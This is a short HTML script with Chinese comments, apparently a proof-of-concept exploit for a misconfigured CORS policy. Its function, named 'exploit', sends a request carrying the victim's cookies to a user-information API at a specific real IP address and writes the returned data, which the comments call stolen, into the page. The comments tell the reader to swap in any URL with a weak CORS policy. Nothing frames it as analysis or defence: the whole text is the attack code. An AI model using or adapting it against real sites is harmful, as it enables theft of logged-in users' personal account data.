<script>
//向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数
function exploit() {
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
     var all = this.responseText;
     document.getElementById("load").innerHTML= all; // 分割打印被盗取的 HTTP 响应
     
      }
 };
 xhttp.open("GET", "http://139.224.42.111/api/user/passport/auth/getUserInfo", true); //将 URL 更改为错误配置 CORS 策略的 URL
 xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
 xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhttp.withCredentials = true;
 xhttp.send();
}

</script>
